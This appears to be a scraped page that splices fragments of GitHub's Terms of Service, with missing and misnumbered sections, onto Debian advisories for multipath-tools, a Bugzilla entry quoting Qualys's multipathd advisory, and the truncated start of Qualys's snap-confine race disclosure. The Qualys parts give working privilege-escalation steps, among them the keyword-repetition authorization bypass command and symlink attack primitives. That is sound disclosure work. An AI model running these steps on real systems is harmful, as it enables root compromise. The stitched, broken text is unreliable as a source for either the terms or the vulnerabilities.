Any User-Generated Content you post publicly, including issues, comments, and contributions to other Users' repositories, may be viewed by others. By setting your repositories to be viewed publicly, you agree to allow others to view and "fork" your repositories (this means that others may make their own copies of Content from your repositories in repositories they control).

If you set your pages and repositories to be viewed publicly, you grant each User of GitHub a nonexclusive, worldwide license to use, display, and perform Your Content through the GitHub Service and to reproduce Your Content solely on GitHub as permitted through GitHub's functionality (for example, through forking). You may grant further rights if you [adopt a license](/en/communities/setting-up-your-project-for-healthy-contributions/adding-a-license-to-a-repository#including-an-open-source-license-in-your-repository). If you are uploading Content you did not create or own, you are responsible for ensuring that the Content you upload is licensed under terms that grant these permissions to other GitHub Users.

### [6. Contributions Under Repository License](#6-contributions-under-repository-license)

Whenever you add Content to a repository containing notice of a license, you license that Content under the same terms, and you agree that you have the right to license that Content under those terms. If you have a separate agreement to license that Content under different terms, such as a contributor license agreement, that agreement will supersede.

Isn't this just how it works already? Yep. This is widely accepted as the norm in the open-source community; it's commonly referred to by the shorthand "inbound=outbound". We're just making it explicit.

### [7. Moral Rights](#7-moral-rights)

You retain all moral rights to Your Content that you upload, publish, or submit to any part of the Service, including the rights of integrity and attribution. However, you waive these rights and agree not to assert them against us, to enable us to reasonably exercise the rights granted in Section D.4, but not otherwise.

To the extent this agreement is not enforceable by applicable law, you grant GitHub the rights we need to use Your Content without attribution and to make reasonable adaptations of Your Content as necessary to render the Website and provide the Service.

## [E. Private Repositories](#e-private-repositories)

**Short version:** *We treat the content of private repositories as confidential, and we only access it as described in our Privacy Statement—for security purposes, to assist the repository owner with a support matter, to maintain the integrity of the Service, to comply with our legal obligations, if we have reason to believe the contents are in violation of the law, or with your consent.*

### [1. Control of Private Repositories](#1-control-of-private-repositories)

Some Accounts may have private repositories, which allow the User to control access to Content.

### [2. Confidentiality of Private Repositories](#2-confidentiality-of-private-repositories)

GitHub considers the contents of private repositories to be confidential to you. GitHub will protect the contents of private repositories from unauthorized use, access, or disclosure in the same manner that we would use to protect our own confidential information of a similar nature and in no event with less than a reasonable degree of care.

### [3. Access](#3-access)

GitHub personnel may only access the content of your private repositories in the situations described in our [Privacy Statement](/en/site-policy/privacy-policies/github-privacy-statement#repository-contents).

You may choose to enable additional access to your private repositories. For example:

* You may enable various GitHub services or features that require additional rights to Your Content in private repositories. These rights may vary depending on the service or feature, but GitHub will continue to treat your private repository Content as confidential. If those services or features require rights in addition to those we need to provide the GitHub Service, we will provide an explanation of those rights.

Additionally, we may be [compelled by law](/en/site-policy/privacy-policies/github-privacy-statement#for-legal-disclosure) to disclose the contents of your private repositories.

GitHub will provide notice regarding our access to private repository content, unless [for legal disclosure](/en/site-policy/privacy-policies/github-privacy-statement#for-legal-disclosure), to comply with our legal obligations, or where otherwise bound by requirements under law, for automated scanning, or if in response to a security threat or other risk to security.

## [F. Copyright Infringement and DMCA Policy](#f-copyright-infringement-and-dmca-policy)

If you believe that content on our website violates your copyright, please contact us in accordance with our [Digital Millennium Copyright Act Policy](/en/site-policy/content-removal-policies/dmca-takedown-policy). If you are a copyright owner and you believe that content on GitHub violates your rights, please contact us via [our convenient DMCA form](https://github.com/contact/dmca) or by emailing copyright@github.com. There may be legal consequences for sending a false or frivolous takedown notice. Before sending a takedown request, you must consider legal uses such as fair use and licensed uses.

We will terminate the Accounts of [repeat infringers](/en/site-policy/content-removal-policies/dmca-takedown-policy#e-repeated-infringement) of this policy.

## [G. Intellectual Property Notice](#g-intellectual-property-notice)

**Short version:** *We own the service and all of our content. In order for you to use our content, we give you certain rights to it, but you may only use our content in the way we have allowed.*

### [1. GitHub's Rights to Content](#1-githubs-rights-to-content)

GitHub and our licensors, vendors, agents, and/or our content providers retain ownership of all intellectual property rights of any kind related to the Website and Service. We reserve all rights that are not expressly granted to you under this Agreement or by law. The look and feel of the Website and Service is copyright © GitHub, Inc. All rights reserved. You may not duplicate, copy, or reuse any portion of the HTML/CSS, JavaScript, or visual design elements or concepts without express written permission from GitHub.

### [2. GitHub Trademarks and Logos](#2-github-trademarks-and-logos)

### [3. License to GitHub Policies](#3-license-to-github-policies)

This Agreement is licensed under this [Creative Commons Zero license](https://creativecommons.org/publicdomain/zero/1.0/). For details, see our [site-policy repository](https://github.com/github/site-policy#license).

## [H. API Terms](#h-api-terms)

**Short version:** *You agree to these Terms of Service, plus this Section H, when using any of GitHub's APIs (Application Provider Interface), including use of the API through a third party product that accesses GitHub.*

Abuse or excessively frequent requests to GitHub via the API may result in the temporary or permanent suspension of your Account's access to the API. GitHub, in our sole discretion, will determine abuse or excessive usage of the API. We will make a reasonable attempt to warn you via email prior to suspension.

You may not share API tokens to exceed GitHub's rate limitations.

You may not use the API to download data or Content from GitHub for spamming purposes, including for the purposes of selling GitHub users' personal information, such as to recruiters, headhunters, and job boards.

All use of the GitHub API is subject to these Terms of Service and the [GitHub Privacy Statement](https://github.com/site/privacy).

GitHub may offer subscription-based access to our API for those Users who require high-throughput access or access that would result in resale of GitHub's Service.

## [I. GitHub Additional Product Terms](#i-github-additional-product-terms)

**Short version:** *You need to follow certain specific terms and conditions for GitHub's various features and products, and you agree to the Supplemental Terms and Conditions when you agree to this Agreement.*

Some Service features may be subject to additional terms specific to that feature or product as set forth in the GitHub Additional Product Terms. By accessing or using the Services, you also agree to the [GitHub Additional Product Terms](/en/site-policy/github-terms/github-terms-for-additional-products-and-features).

## [J. Beta Previews](#j-beta-previews)

**Short version:** *Beta Previews may not be supported or may change at any time. You may receive confidential information through those programs that must remain confidential while the program is private. We'd love your feedback to make our Beta Previews better.*

### [1. Subject to Change](#1-subject-to-change)

Beta Previews may not be supported and may be changed at any time without notice. In addition, Beta Previews are not subject to the same security measures and auditing to which the Service has been and is subject. **By using a Beta Preview, you use it at your own risk.**

### [2. Confidentiality](#2-confidentiality)

As a user of Beta Previews, you may get access to special information that isn’t available to the rest of the world. Due to the sensitive nature of this information, it’s important for us to make sure that you keep that information secret.

**Confidentiality Obligations.** You agree that any non-public Beta Preview information we give you, such as information about a private Beta Preview, will be considered GitHub’s confidential information (collectively, “Confidential Information”), regardless of whether it is marked or identified as such. You agree to only use such Confidential Information for the express purpose of testing and evaluating the Beta Preview (the “Purpose”), and not for any other purpose. You should use the same degree of care as you would with your own confidential information, but no less than reasonable precautions to prevent any unauthorized use, disclosure, publication, or dissemination of our Confidential Information. You promise not to disclose, publish, or disseminate any Confidential Information to any third party, unless we don’t otherwise prohibit or restrict such disclosure (for example, you might be part of a GitHub-organized group discussion about a private Beta Preview feature).

**Exceptions.** Confidential Information will not include information that is: (a) or becomes publicly available without breach of this Agreement through no act or inaction on your part (such as when a private Beta Preview becomes a public Beta Preview); (b) known to you before we disclose it to you; (c) independently developed by you without breach of any confidentiality obligation to us or any third party; or (d) disclosed with permission from GitHub. You will not violate the terms of this Agreement if you are required to disclose Confidential Information pursuant to operation of law, provided GitHub has been given reasonable advance written notice to object, unless prohibited by law.

### [3. Feedback](#3-feedback)

We’re always trying to improve of products and services, and your feedback as a Beta Preview user will help us do that. If you choose to give us any ideas, know-how, algorithms, code contributions, suggestions, enhancement requests, recommendations or any other feedback for our products or services (collectively, “Feedback”), you acknowledge and agree that GitHub will have a royalty-free, fully paid-up, worldwide, transferable, sub-licensable, irrevocable and perpetual license to implement, use, modify, commercially exploit and/or incorporate the Feedback into our products, services, and documentation.

## [K. Payment](#k-payment)

### [1. Pricing](#1-pricing)

Our pricing and payment terms are available at [github.com/pricing](https://github.com/pricing). If you agree to a subscription price, that will remain your price for the duration of the payment term; however, prices are subject to change at the end of a payment term.

### [2. Upgrades, Downgrades, and Changes](#2-upgrades-downgrades-and-changes)

* We will immediately bill you when you upgrade from the free plan to any paying plan.
* If you change from a monthly billing plan to a yearly billing plan, GitHub will bill you for a full year at the next monthly billing date.
* If you upgrade to a higher level of service, we will bill you for the upgraded plan immediately.
* You may change your level of service at any time by [choosing a plan option](https://github.com/pricing) or going into your [Billing settings](https://github.com/settings/billing). If you choose to downgrade your Account, you may lose access to Content, features, or capacity of your Account. Please see our section on [Cancellation](#l-cancellation-and-termination) for information on getting a copy of that Content.

### [3. Billing Schedule; No Refunds](#3-billing-schedule-no-refunds)

**Payment Based on Plan** For monthly or yearly payment plans, the Service is billed in advance on a monthly or yearly basis respectively and is non-refundable. There will be no refunds or credits for partial months of service, downgrade refunds, or refunds for months unused with an open Account; however, the service will remain active for the length of the paid billing period. In order to treat everyone equally, no exceptions will be made.

**Payment Based on Usage** Some Service features are billed based on your usage. A limited quantity of these Service features may be included in your plan for a limited term without additional charge. If you choose to use paid Service features beyond the quantity included in your plan, you pay for those Service features based on your actual usage in the preceding month. Monthly payment for these purchases will be charged on a periodic basis in arrears. See [GitHub Additional Product Terms for Details](/en/site-policy/github-terms/github-terms-for-additional-products-and-features).

**Invoicing** For invoiced Users, User agrees to pay the fees in full, up front without deduction or setoff of any kind, in U.S. Dollars. User must pay the fees within thirty (30) days of the GitHub invoice date. Amounts payable under this Agreement are non-refundable, except as otherwise provided in this Agreement. If User fails to pay any fees on time, GitHub reserves the right, in addition to taking any other action at law or equity, to (i) charge interest on past due amounts at 1.0% per month or the highest interest rate allowed by law, whichever is less, and to charge all expenses of recovery, and (ii) terminate the applicable order form. User is solely responsible for all taxes, fees, duties and governmental assessments (except for taxes based on GitHub's net income) that are imposed or become due in connection with this Agreement.

### [4. Authorization](#4-authorization)

Free Accounts are not required to provide payment information.

## [L. Cancellation and Termination](#l-cancellation-and-termination)

**Short version:** *You may close your Account at any time. If you do, we'll treat your information responsibly.*

### [1. Account Cancellation](#1-account-cancellation)

You can [cancel your Account at any time](/en/billing/managing-the-plan-for-your-github-account/downgrading-your-accounts-plan) by going into your Settings in the global navigation bar at the top of the screen. The Account screen provides a simple, no questions asked cancellation link. We are not able to cancel Accounts in response to an email or phone request.

### [2. Upon Cancellation](#2-upon-cancellation)

We will retain and use your information as necessary to comply with our legal obligations, resolve disputes, and enforce our agreements, but barring legal requirements, we will delete your full profile and the Content of your repositories within 90 days of cancellation or termination (though some information may remain in encrypted backups). This information cannot be recovered once your Account is canceled.

We will not delete Content that you have contributed to other Users' repositories or that other Users have forked.

Upon request, we will make a reasonable effort to provide an Account owner with a copy of your lawful, non-infringing Account contents after Account cancellation, termination, or downgrade. You must make this request within 90 days of cancellation, termination, or downgrade.

### [3. GitHub May Terminate](#3-github-may-terminate)

This section does not affect your non-waivable rights.

### [2. Legal Notice to GitHub Must Be in Writing](#2-legal-notice-to-github-must-be-in-writing)

Communications made through email or GitHub Support's messaging system will not constitute legal notice to GitHub or any of its officers, employees, agents or representatives in any situation where notice to GitHub is required by contract or any law or regulation. Legal notice to GitHub must be in writing and [served on GitHub's legal agent](/en/site-policy/other-site-policies/guidelines-for-legal-requests-of-user-data#submitting-requests).

### [3. No Phone Support](#3-no-phone-support)

GitHub only offers support via email, in-Service communications, and electronic messages. We do not offer telephone support.

## [N. Disclaimer of Warranties](#n-disclaimer-of-warranties)

**Short version:** *We provide our service as is, and we make no promises or guarantees about this service. Please read this section carefully; you should understand what to expect.*

GitHub provides the Website and the Service “as is” and “as available,” without warranty of any kind. Without limiting this, we expressly disclaim all warranties, whether express, implied or statutory, regarding the Website and the Service including without limitation any warranty of merchantability, fitness for a particular purpose, title, security, accuracy and non-infringement.

## [O. Limitation of Liability](#o-limitation-of-liability)

**Short version:** *We will not be liable for damages or losses arising from your use or inability to use the service or otherwise arising under this agreement. Please read this section carefully; it limits our obligations to you.*

You understand and agree that we will not be liable to you or any third party for any loss of profits, use, goodwill, or data, or for any incidental, indirect, special, consequential or exemplary damages, however arising, that result from

* the use, disclosure, or display of your User-Generated Content;
* your use or inability to use the Service;
* any modification, price change, suspension or discontinuance of the Service;
* the Service generally or the software or systems that make the Service available;
* unauthorized access to or alterations of your transmissions or data;
* statements or conduct of any third party on the Service;
* any other user interactions that you input or receive through your use of the Service; or
* any other matter relating to the Service.

Our liability is limited whether or not we have been informed of the possibility of such damages, and even if a remedy set forth in this Agreement is found to have failed of its essential purpose. We will have no liability for any failure or delay due to matters beyond our reasonable control.

## [P. Release and Indemnification](#p-release-and-indemnification)

**Short version:** *You are responsible for your use of the service. If you harm someone else or get into a dispute with someone else, we will not be involved.*

If you have a dispute with one or more Users, you agree to release GitHub from any and all claims, demands and damages (actual and consequential) of every kind and nature, known and unknown, arising out of or in any way connected with such disputes.

You agree to indemnify us, defend us, and hold us harmless from and against any and all claims, liabilities, and expenses, including attorneys’ fees, arising out of your use of the Website and the Service, including but not limited to your violation of this Agreement, provided that GitHub (1) promptly gives you written notice of the claim, demand, suit or proceeding; (2) gives you sole control of the defense and settlement of the claim, demand, suit or proceeding (provided that you may not settle any claim, demand, suit or proceeding unless the settlement unconditionally releases GitHub of all liability); and (3) provides to you all reasonable assistance, at your expense.

## [Q. Changes to These Terms](#q-changes-to-these-terms)

**Short version:** *We want our users to be informed of important changes to our terms, but some changes aren't that important — we don't want to bother you every time we fix a typo. So while we may modify this agreement at any time, we will notify users of any material changes and give you time to adjust to them.*

We reserve the right, at our sole discretion, to amend these Terms of Service at any time and will update these Terms of Service in the event of any such amendments. We will notify our Users of material changes to this Agreement, such as price increases, at least 30 days prior to the change taking effect by posting a notice on our Website or sending email to the primary email address specified in your GitHub account. Customer's continued use of the Service after those 30 days constitutes agreement to those revisions of this Agreement. For any other modifications, your continued use of the Website constitutes agreement to our revisions of these Terms of Service. You can view all changes to these Terms in our [Site Policy](https://github.com/github/site-policy) repository.

Debian Security Advisory DSA-5366-1                   security@debian.org
<https://www.debian.org/security/>                     Salvatore Bonaccorso

Package        : multipath-tools
CVE ID         : CVE-2022-41973 CVE-2022-41974
Debian Bug     : 1022742

The Qualys Research Labs reported an authorization bypass
(CVE-2022-41974) and a symlink attack (CVE-2022-41973) in
multipath-tools, a set of tools to drive the Device Mapper multipathing
driver, which may result in local privilege escalation.

Please refer to /usr/share/doc/multipath-tools/NEWS.Debian.gz for
backwards-incompatible changes in this update.

For the stable distribution (bullseye), these problems have been fixed in
version 0.8.5-2+deb11u1.

We recommend that you upgrade your multipath-tools packages.

For the detailed security status of multipath-tools please refer to its
security tracker page at:
<https://security-tracker.debian.org/tracker/multipath-tools>

multipath-tools: use /run instead of /dev/shm

```
/dev/shm may have unsafe permissions. Use /run instead.
Use systemd's tmpfiles.d mechanism to create /run/multipath
early during boot.

For backward compatibilty, make the runtime directory configurable
via the "runtimedir" make variable.

The device-mapper-multipath allows local users to obtain root access, exploited alone or in conjunction with CVE-2022-41973. Local users that are able to write to UNIX domain sockets can bypass access controls and manipulate the multipath setup. This issue occurs because an attacker can repeat a keyword, which is mishandled when arithmetic ADD is used instead of bitwise OR. This could lead to local privilege escalation to root. | | | Clone Of: |  | | | Environment: |  | | | Last Closed: | 2023-05-16 15:15:48 UTC | | | Embargoed: |  | | |

## Description

multipath-tools 0.7.0 through 0.9.x before 0.9.2 allows local users to obtain root access, as exploited alone or in conjunction with [CVE-2022-41973](https://github.com/advisories/GHSA-6c7c-85qv-wvgp "CVE-2022-41973"). Local users able to write to UNIX domain sockets can bypass access controls and manipulate the multipath setup. This can lead to local privilege escalation to root. This occurs because an attacker can repeat a keyword, which is mishandled because arithmetic ADD is used instead of bitwise OR.

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

Package        : multipath-tools
Version        : 0.7.9-3+deb10u2
CVE ID         : CVE-2022-41973 CVE-2022-41974
Debian Bug     : 1022742

Multiple issues were found in multipath-tools, a tool-chain to manage disk
multipath device maps, which may be used by local attackers to obtain root
privileges or create a directories or overwrite files via symlink attacks.

Please note that the fix for CVE-2022-41973 involves switching from
/dev/shm to systemd-tmpfiles (/run/multipath-tools).
If you have previously accesssed /dev/shm directly, please update your
setup to the new path to facilitate this change.

CVE-2022-41973

    multipath-tools 0.7.7 through 0.9.x before 0.9.2 allows local users to
    obtain root access, as exploited in conjunction with CVE-2022-41974.
    Local users able to access /dev/shm can change symlinks in multipathd
    due to incorrect symlink handling, which could lead to controlled file
    writes outside of the /dev/shm directory. This could be used indirectly
    for local privilege escalation to root.

CVE-2022-41974

    multipath-tools 0.7.0 through 0.9.x before 0.9.2 allows local users to
    obtain root access, as exploited alone or in conjunction with
    CVE-2022-41973. Local users able to write to UNIX domain sockets can
    bypass access controls and manipulate the multipath setup. This can lead
    to local privilege escalation to root. This occurs because an attacker
    can repeat a keyword, which is mishandled because arithmetic ADD is used
    instead of bitwise OR.

For Debian 10 buster, these problems have been fixed in version
0.7.9-3+deb10u2.

We recommend that you upgrade your multipath-tools packages.

For the detailed security status of multipath-tools please refer to
its security tracker page at:

| [Description](show_bug.cgi?id=2123894#c0)  Sage McTaggart    2022-09-02 23:02:27 UTC  ``` Qualys Security Advisory <https://www.qualys.com/2022/10/24/leeloo-multipath/leeloo-multipath.txt> <https://www.openwall.com/lists/oss-security/2022/10/24/2>  Authorization bypass and symlink attack in multipathd (CVE-2022-AUTHZ and CVE-2022-SLINK)  ======================================================================== Contents ========================================================================  Summary CVE-2022-AUTHZ: Authorization bypass CVE-2022-SLINK: Symlink attack Acknowledgments Timeline   ======================================================================== Summary ========================================================================  We discovered two local vulnerabilities (an authorization bypass and a symlink attack) in multipathd, a daemon that is running as root in the default installation of (for example) Ubuntu Server:  <https://ubuntu.com/server/docs/device-mapper-multipathing-introduction> <https://github.com/opensvc/multipath-tools>  We combined these two vulnerabilities with a third vulnerability, in another package that is also installed by default on Ubuntu Server, and obtained full root privileges on Ubuntu Server 22.04; other releases are probably also exploitable. We will publish this third vulnerability, and the complete details of this local privilege escalation, in an upcoming advisory.  The authorization bypass (CVE-2022-AUTHZ) was introduced in February 2017 (version 0.7.0) by commit 9acda0c ("Perform socket client uid check on IPC commands"), but earlier versions perform no authorization checks at all: any unprivileged local user can issue any privileged command to multipathd.  The symlink attack (CVE-2022-SLINK) was introduced in May 2018 (version 0.7.7) by commit 65d0a63 ("functions to indicate mapping failure in /dev/shm"); the vulnerable code was hardened significantly in May 2020 (version 0.8.5) by commit 40ee3ea ("simplify failed wwid code"), but it remains exploitable nonetheless.   ======================================================================== CVE-2022-AUTHZ: Authorization bypass ========================================================================  The multipathd daemon listens for client connections on an abstract Unix socket (conveniently, the multipathd binary itself can act as a client, if executed with non-option arguments; we use this feature extensively in this advisory to connect and send commands to the multipathd daemon):  ------------------------------------------------------------------------ $ ps -ef | grep 'multipath[d]' root 377 1 0 13:55 ? 00:00:00 /sbin/multipathd -d -s  $ ss -l -x | grep 'multipathd' u_str LISTEN 0 4096 @/org/kernel/linux/storage/multipathd 18105 ------------------------------------------------------------------------  The commands sent by a client to multipathd are composed of keywords, and internally, each keyword is identified by a different bit; for example, "list" is 1 (1<<0), "add" is 2 (1<<1), and "path" (which requires a parameter) is 65536 (1<<16):  ------------------------------------------------------------------------ 155 load_keys (void) ... 163 r += add_key(keys, "list", LIST, 0); 164 r += add_key(keys, "show", LIST, 0); 165 r += add_key(keys, "add", ADD, 0); ... 183 r += add_key(keys, "path", PATH, 1); ------------------------------------------------------------------------ 53 #define LIST (1ULL << __LIST) 54 #define ADD (1ULL << __ADD) .. 69 #define PATH (1ULL << __PATH) ------------------------------------------------------------------------ 6 enum { 7 __LIST, /* 0 */ 8 __ADD, .. 23 __PATH, ------------------------------------------------------------------------  In turn, each command is associated with a handler (a C function) by its fingerprint -- the bitwise OR of its constituent keywords; for example, the command "list path PARAM" is associated with cli_list_path() by the fingerprint 65537 (LIST+PATH=1+65536), and the command "add path PARAM" is associated with cli_add_path() by the fingerprint 65538 (ADD+PATH=2+65536):  ------------------------------------------------------------------------ 1522 void init_handler_callbacks(void) .... 1527 set_handler_callback(LIST+PATH, cli_list_path); .... 1549 set_handler_callback(ADD+PATH, cli_add_path); ------------------------------------------------------------------------ 321 static uint64_t 322 fingerprint(const struct _vector *vec) ... 325 uint64_t fp = 0; ... 331 vector_foreach_slot(vec, kw, i) 332 fp += kw->code; 333 334 return fp; ------------------------------------------------------------------------ 89 static struct handler * 90 find_handler (uint64_t fp) .. 95 vector_foreach_slot (handlers, h, i) 96 if (h->fingerprint == fp) 97 return h; 98 99 return NULL; ------------------------------------------------------------------------  When multipathd receives a command from a client, it first performs an authentication check and an authorization check (both at line 491):  ------------------------------------------------------------------------ 431 static int client_state_machine(struct client *c, struct vectors *vecs, ... 485 case CLT_PARSE: 486 c->error = parse_cmd(c); 487 if (!c->error) { ... 491 if (!c->is_root && kw->code != LIST) { 492 c->error = -EPERM; ... 495 } 496 } 497 if (c->error) ... 501 else 502 set_client_state(c, CLT_WORK); ... 522 case CLT_WORK: 523 c->error = execute_handler(c, vecs); ------------------------------------------------------------------------  - Authentication: if the client's UID (obtained from SO_PEERCRED) is 0 (i.e., if is_root is true), then the client is privileged; otherwise, it is unprivileged.  - Authorization: if the client is privileged, it is allowed to execute any commands; otherwise, only unprivileged LIST commands are allowed (i.e., commands whose first keyword is either "list" or "show").  Attentive readers may have noticed that multipathd does not, in fact, calculate the fingerprint of a command by bitwise-ORing its constituent keywords, but by arithmetic-ADDing them (at line 332). While these two operations are equivalent if no keyword is repeated, we (attackers) can send a seemingly unprivileged command (whose first keyword is "list") but whose fingerprint matches a privileged command (by repeating the "list" keyword): we can exploit this flaw to bypass multipathd's authorization check.  For example, we are not allowed to execute "add path PARAM" (whose fingerprint is 2+65536=65538) because the first keyword is not "list", but we are allowed to execute the equivalent "list list path PARAM" (whose fingerprint is also 1+1+65536=65538, instead of 1|1|65536=65537) because the first keyword is "list" (the multipathd daemon below replies "blacklisted" because PARAM is an invalid path, not because the command is denied):  ------------------------------------------------------------------------ $ multipathd add path PARAM permission deny: need to be root  $ multipathd list list path PARAM blacklisted ------------------------------------------------------------------------  This authorization bypass greatly enlarges the attack surface of multipathd: 34 privileged command handlers become available to local attackers, in addition to the 23 unprivileged command handlers that are normally available. We audited only a few of these command handlers, because we quickly discovered a low-hanging vulnerability (a symlink attack) in one of them.   ======================================================================== CVE-2022-SLINK: Symlink attack ========================================================================  multipathd operates insecurely, as root, in /dev/shm (a sticky, world-writable directory similar to /tmp). The vulnerable code (in mark_failed_wwid()) may be executed during the normal lifetime of multipathd, but a local attacker can force its execution by exploiting the authorization bypass CVE-2022-AUTHZ; for example, by adding a "whitelisted, unmonitored" device to multipathd:  ------------------------------------------------------------------------ $ multipathd list devices | grep 'whitelisted, unmonitored' sda1 devnode whitelisted, unmonitored ...  $ multipathd list list path sda1 fail ------------------------------------------------------------------------  This command, which is equivalent to "add path sda1", results in the following system-call trace (strace) of the multipathd daemon:  ------------------------------------------------------------------------ 386 openat(AT_FDCWD, "/dev/shm/multipath/failed_wwids", O_RDONLY|O_DIRECTORY) = -1 ENOENT (No such file or directory) 387 mkdir("/dev", 0700) = -1 EEXIST (File exists) 388 mkdir("/dev/shm", 0700) = -1 EEXIST (File exists) 389 mkdir("/dev/shm/multipath", 0700) = 0 390 mkdir("/dev/shm/multipath/failed_wwids", 0700) = 0 391 openat(AT_FDCWD, "/dev/shm/multipath/failed_wwids", O_RDONLY|O_DIRECTORY) = 12 392 getpid() = 375 393 openat(12, "VBOX_HARDDISK_VB60265ca5-df119cb6.177", O_RDONLY|O_CREAT|O_EXCL, 0400) = 13 394 close(13) = 0 395 linkat(12, "VBOX_HARDDISK_VB60265ca5-df119cb6.177", 12, "VBOX_HARDDISK_VB60265ca5-df119cb6", 0) = 0 396 unlinkat(12, "VBOX_HARDDISK_VB60265ca5-df119cb6.177", 0) = 0 397 close(12) = 0 ------------------------------------------------------------------------  - at line 389, the directory "/dev/shm/multipath" is created, if it does not exist already;  - at line 390, the directory "/dev/shm/multipath/failed_wwids" is created, if it does not exist already;  - at lines 391-397, the empty file "/dev/shm/multipath/failed_wwids/VBOX_HARDDISK_VB60265ca5-df119cb6" is created, if it does not exist already (its name is the "World Wide ID" of the added device).  multipathd is therefore vulnerable to two different symlink attacks:  1/ if we (attackers) create an arbitrary symlink "/dev/shm/multipath", then we can create a directory named "failed_wwids" (user root, group root, mode 0700) anywhere in the filesystem;  2/ if we create an arbitrary symlink "/dev/shm/multipath/failed_wwids", then we can create a file named "VBOX_HARDDISK_VB60265ca5-df119cb6" (user root, group root, mode 0400, size 0) anywhere in the filesystem.  These two symlink attacks are very weak, because we do not control the name, user, group, mode, or contents of the directory or file that we create; only its location. Despite these limitations, we were able to combine multipathd's vulnerabilities (authorization bypass and symlink attack) with a third vulnerability (in another package), and obtained full root privileges on Ubuntu Server 22.04; we will publish this third vulnerability in an upcoming advisory.  Side note: initially, we thought that the symlink attack 1/ would fail, because /dev/shm is a sticky world-writable directory, and the kernel's fs.protected_symlinks is 1 by default; to our great surprise, however, it succeeded. Eventually, we understood that only the final component of a path is protected, not its intermediate components; for example, if /tmp/foo is a symlink, then an access to /tmp/foo itself is protected, but an access to /tmp/foo/bar is not. Interestingly, this weakness was already pointed out in 2017 by Solar Designer, and the original Openwall, grsecurity, and Yama protections are not affected:  <https://www.openwall.com/lists/kernel-hardening/2017/06/06/74>   ======================================================================== Acknowledgments ========================================================================   ======================================================================== Timeline   ```  [Comment 1](show_bug.cgi?id=2123894#c1)  Ben Marzinski    2022-09-16 20:44:33 UTC  ``` Is there a document on the CVE workflow? I was under the impression that bugs would also be created for the various releases of the device-mapper-multipath package, and those where what would be used to fix this issue.

Summary
========================================================================

We discovered a race condition (CVE-2022-3328) in snap-confine, a
SUID-root program installed by default on Ubuntu. In this advisory, we
tell the story of this vulnerability (which was introduced in February
2022 by the patch for CVE-2021-44731) and detail how we exploited it in
Ubuntu Server (a local privilege escalation, from any user to root) by
combining it with two vulnerabilities in multipathd (an authorization
bypass and a symlink attack, CVE-2022-41974 and CVE-2022-41973):

<https://www.qualys.com/2022/10/24/leeloo-multipath/leeloo-multipath.txt>

========================================================================
Background
========================================================================

    Like the crack of the whip, I Snap! attack
    Radical mind, day and night all the time
        -- SNAP! - The Power

In February 2022, we published CVE-2021-44731 in our "Lemmings" advisory
(<https://www.qualys.com/2022/02/17/cve-2021-44731/oh-snap-more-lemmings.txt>):
to set up a snap's sandbox, snap-confine created the temporary directory
/tmp/snap.$SNAP_NAME or reused it if it already existed, even if it did
not belong to root; a local attacker could race against snap-confine,
retain control over /tmp/snap.$SNAP_NAME, and eventually obtain full
root privileges.

This vulnerability was patched by commit acb2b4c ("cmd/snap-confine:
Prevent user-controlled race in setup_private_mount"), which introduced
a new helper function, must_mkdir_and_open_with_perms():

------------------------------------------------------------------------
142 static void setup_private_mount(const char *snap_name)
...
169         sc_must_snprintf(base_dir, sizeof(base_dir), "/tmp/snap.%s", snap_name);
...
176         base_dir_fd = must_mkdir_and_open_with_perms(base_dir, 0, 0, 0700);
------------------------------------------------------------------------
 55 static int must_mkdir_and_open_with_perms(const char *dir, uid_t uid, gid_t gid,
 56                                           mode_t mode)
 ..
 61  mkdir:
 ..
 67         if (mkdir(dir, 0700) < 0 && errno != EEXIST) {
 ..
 70         fd = open(dir, O_RDONLY | O_DIRECTORY | O_CLOEXEC | O_NOFOLLOW);
 ..
 81         if (fstat(fd, &st) < 0) {
 ..
 84         if (st.st_uid != uid || st.st_gid != gid
 85             || st.st_mode != (S_IFDIR | mode)) {
...
130                 if (rename(dir, random_dir) < 0) {
...
135                 goto mkdir;
------------------------------------------------------------------------

- the temporary directory /tmp/snap.$SNAP_NAME is created at line 67, if
  it does not exist already;

- if it already exists, and if it does not belong to root (at line 84),
  then it is moved out of the way (at line 130) by rename()ing it to a
  random directory in /tmp, and its creation is retried (at line 135).

When we reviewed this patch back in December 2021, we felt very nervous
about this rename() call (because it allows a local attacker to rename()
a directory they do not own), and we advised the Ubuntu Security Team to
either not reuse the directory /tmp/snap.$SNAP_NAME at all, or to create
it in a non-world-writable directory instead of /tmp, or at least to use
renameat2(RENAME_EXCHANGE) instead of rename(). Unfortunately, all of
these ideas were deemed impractical (for example, renameat2() is not
supported by older kernel and glibc versions); moreover, we (Qualys)
failed to come up with a feasible attack plan against this rename()
call, so the patch was kept in its current form.

After the release of Ubuntu 22.04 in April 2022, we decided to revisit
snap-confine and its recent hardening changes, and we finally found a
way to exploit the rename() call in must_mkdir_and_open_with_perms().

========================================================================
Exploitation
========================================================================

    It's getting, it's getting, it's getting kinda heavy
    It's getting, it's getting, it's getting kinda hectic
        -- SNAP! - The Power

The three key ideas to exploit the rename() of /tmp/snap.$SNAP_NAME are:

1/ snap-confine operates in /tmp to create a snap's temporary directory
(/tmp/snap.$SNAP_NAME in setup_private_mount()), but it also operates in
/tmp to create the snap's *root* directory (/tmp/snap.rootfs_XXXXXX in
sc_bootstrap_mount_namespace(), where all of the Xs are randomized by
mkdtemp()), and the string rootfs_XXXXXX is accepted as a valid snap
instance name by sc_instance_name_validate() (when all of the Xs are
lowercase alphanumeric):

------------------------------------------------------------------------
286 static void sc_bootstrap_mount_namespace(const struct sc_mount_config *config)
...
288         char scratch_dir[] = "/tmp/snap.rootfs_XXXXXX";
...
291         if (mkdtemp(scratch_dir) == NULL) {
...
303         sc_do_mount(scratch_dir, scratch_dir, NULL, MS_BIND, NULL);
...
319         sc_do_mount(config->rootfs_dir, scratch_dir, NULL, MS_REC | MS_BIND,
...
331         for (const struct sc_mount * mnt = config->mounts; mnt->path != NULL;
...
342                 sc_must_snprintf(dst, sizeof dst, "%s/%s", scratch_dir,
343                                  mnt->path);
...
